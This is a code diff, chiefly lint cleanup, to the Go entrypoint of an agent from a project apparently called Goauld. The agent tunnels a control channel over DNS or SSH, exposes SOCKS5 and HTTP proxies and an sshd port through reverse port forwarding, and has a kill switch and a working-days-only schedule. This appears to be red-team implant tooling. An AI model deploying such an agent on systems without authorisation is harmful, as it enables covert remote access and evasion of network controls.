@@ -1,3 +1,4 @@
+// Package main holds the agent entrypoint
 package main
 
 import (
@@ -8,6 +9,7 @@ import (
 	"Goauld/common"
 	"Goauld/common/utils"
 	"context"
+	"errors"
 	"fmt"
 	"io"
 	"net"
@@ -34,10 +36,13 @@ func main() {
 	_, warnings, err := config.InitAgent()
 	if err != nil {
 		log.Error().Err(err).Msg("error initializing the agent")
+
 		return
 	}
 	if config.Get().DoPrintVersion() {
+		//nolint:forbidigo
 		fmt.Println(common.GetVersion())
+
 		return
 	}
 	if len(warnings) > 0 {
@@ -50,15 +55,19 @@ func main() {
 		if err != nil {
 			log.Error().Err(err).Msg("error starting the agent in background")
 		}
+
 		return
 	}
 	if config.Get().DoGenerateConfig() {
 		conf, err := config.Get().GenerateYAMLConfig()
 		if err != nil {
 			log.Error().Err(err).Msg("error generating the agent config")
+
 			return
 		}
+		//nolint:forbidigo
 		fmt.Println(conf)
+
 		return
 	}
 	killSwitchDuration := KillSwitchLoop(config.Get().GetKillSwitchDays())
@@ -72,6 +81,7 @@ func main() {
 		log.Info().Msg("Starting agent")
 		if config.Get().IsOutOfWorkingDay() {
 			LogNextStart()
+
 			return nil, backoff.RetryAfter(60)
 		}
 		cancelReason := run()
@@ -83,9 +93,12 @@ func main() {
 				log.Warn().Err(err).Msg("error cleaning up VSCode after agent exit")
 			}
 			time.Sleep(time.Second)
+
+			//nolint:nilnil
 			return nil, nil
 		}
 		log.Reset().Str("Reason", cancelReason.Msg).Msg("Agent restarting")
+
 		return nil, fmt.Errorf("agent restarting: %s", cancelReason.Msg)
 	}
 
@@ -101,21 +114,22 @@ func main() {
 		backoff.WithBackOff(exp),
 		backoff.WithMaxTries(config.Get().GetMexRetries()),
 		backoff.WithMaxElapsedTime(killSwitchDuration),
-		backoff.WithNotify(func(err error, duration time.Duration) {
+		backoff.WithNotify(func(_ error, _ time.Duration) {
 
 		}),
 	)
 	if err != nil {
 		log.Info().Err(err).Msg("Agent shut down")
+
 		return
 	}
 	if result != nil {
+		//nolint:forbidigo
 		fmt.Println(result)
 	}
 }
 
 func run() utils.CancelReason {
-
 	var dnsTransport *transport.DNSSH
 	cancelReason := make(chan utils.CancelReason)
 	controlErr := make(chan error)
@@ -178,7 +192,8 @@ func run() utils.CancelReason {
 						return err
 					}
 				}
-				return client.InitOverDns(dnsTransport.ControlStream, success, chanErr)
+
+				return client.InitOverDNS(dnsTransport.ControlStream, success, chanErr)
 			},
 		},
 	}
@@ -211,6 +226,7 @@ func run() utils.CancelReason {
 			success = true
 			controlPlanClient = cpc
 			controlMode = initializer.Name
+
 			break
 		}
 		log.Error().Err(err).Str("ControlMode", initializer.Name).Msg("error initializing the control plan")
@@ -248,6 +264,7 @@ func run() utils.CancelReason {
 		if err != nil {
 			log.Error().Err(err).Msg("error initializing the SSH")
 			globalCanceler.Restart("unable to init the SSH connection")
+
 			return
 		}
 
@@ -258,6 +275,7 @@ func run() utils.CancelReason {
 			rListener, rPort, err := sshAgent.GetRemoteConn(config.Get().RemoteForwardedSshdAddress())
 			if err != nil {
 				log.Error().Err(err).Msg("error initializing the SSHD connection")
+
 				return
 			}
 			config.Get().UpdateSshdPort(rPort)
@@ -309,12 +327,12 @@ func run() utils.CancelReason {
 						log.Error().Err(err).Msg("socks server error")
 					}
 					err := socks5.Close()
-					if err != nil && err != io.EOF {
+					if err != nil && !errors.Is(err, io.EOF) {
 						log.Warn().Err(err).Msg("socks close error")
 					}
 				case <-ctx.Done():
 					err := socks5.Close()
-					if err != nil && err != io.EOF {
+					if err != nil && !errors.Is(err, io.EOF) {
 						log.Warn().Err(err).Msg("socks close error")
 					}
 				}
@@ -329,12 +347,13 @@ func run() utils.CancelReason {
 		}
 
 		// If the HTTP proxy server is enabled, start it
-		if config.Get().HttpProxyEnabled() {
-			httpProxy := proxy.InitHttpProxy()
+		if config.Get().HTTPProxyEnabled() {
+			httpProxy := proxy.InitHTTPProxy()
 
 			listener, err := net.Listen("tcp4", "127.0.0.1:0")
+			//nolint:forcetypeassert
 			port := listener.Addr().(*net.TCPAddr).Port
-			//rListener, rPort, err := sshAgent.GetRemoteConn(config.Get().RemoteForwardedHttpProxyAddress())
+			// rListener, rPort, err := sshAgent.GetRemoteConn(config.Get().RemoteForwardedHTTPProxyAddress())
 			if err != nil {
 				log.Error().Err(err).Msg("error initializing the HTTP proxy connection")
 			}
@@ -344,9 +363,9 @@ func run() utils.CancelReason {
 				AgentIP:    "127.0.0.1",
 				Tag:        "HTTP",
 			}
-			rPort, err := sshAgent.RemoteForward(rpf, ctx)
+			rPort, err := sshAgent.RemoteForward(ctx, rpf)
 
-			config.Get().UpdateHttpProxyPort(rPort)
+			config.Get().UpdateHTTPProxyPort(rPort)
 
 			go func() {
 				select {
@@ -368,7 +387,7 @@ func run() utils.CancelReason {
 
 			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote HTTP proxy server started")
 			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
-				ServerPort: config.Get().RemoteForwardedHttpProxyPort(),
+				ServerPort: config.Get().RemoteForwardedHTTPProxyPort(),
 				AgentPort:  -1,
 				AgentIP:    "0.0.0.0",
 				Tag:        "HTTP",
@@ -378,9 +397,10 @@ func run() utils.CancelReason {
 		// For all porte forwards, launch the forwarding
 		rpf := config.Get().GetRemotePortForwarding()
 		for i := range rpf {
-			port, err := sshAgent.RemoteForward(rpf[i], ctx)
+			port, err := sshAgent.RemoteForward(ctx, rpf[i])
 			if err != nil {
 				log.Error().Err(err).Str("Local", rpf[i].GetLocal()).Str("Remote", rpf[i].GetRemote()).Msg("error initializing the port forwarding")
+
 				continue
 			}
 			rpf[i].ServerPort = port
@@ -408,12 +428,11 @@ func run() utils.CancelReason {
 			if err != nil {
 				log.Warn().Err(err).Msg("keep awake close error")
 			}
-
 		}()
 	}
 
 	if config.Get().OnlyWorkingDays() {
-		go OnlyWorkingDayLoop(globalCanceler, ctx)
+		go OnlyWorkingDayLoop(ctx, globalCanceler)
 	}
 	// Wait for errors to occur and print them
 	select {
@@ -441,6 +460,7 @@ func run() utils.CancelReason {
 		log.Error().Err(ctx.Err())
 	}
 	reason := <-cancelReason
+
 	return reason
 }
 
@@ -458,12 +478,13 @@ func HandleCtrlC(controlPlanClient *control.ControlPlanClient, canceler *utils.G
 			controlPlanClient.Close()
 		}
 	}()
+
 	return func() {
 		signal.Stop(c)
 	}
 }
 
-func OnlyWorkingDayLoop(canceler *utils.GlobalCanceler, ctx context.Context) {
+func OnlyWorkingDayLoop(ctx context.Context, canceler *utils.GlobalCanceler) {
 	t := time.NewTicker(1 * time.Minute)
 	defer t.Stop()
 	for {
@@ -477,7 +498,6 @@ func OnlyWorkingDayLoop(canceler *utils.GlobalCanceler, ctx context.Context) {
 			return
 		}
 	}
-
 }
 
 func KillSwitchLoop(days int) time.Duration {
@@ -496,6 +516,7 @@ func KillSwitchLoop(days int) time.Duration {
 		time.Sleep(3 * time.Second)
 		os.Exit(4)
 	}()
+
 	return d
 }
 
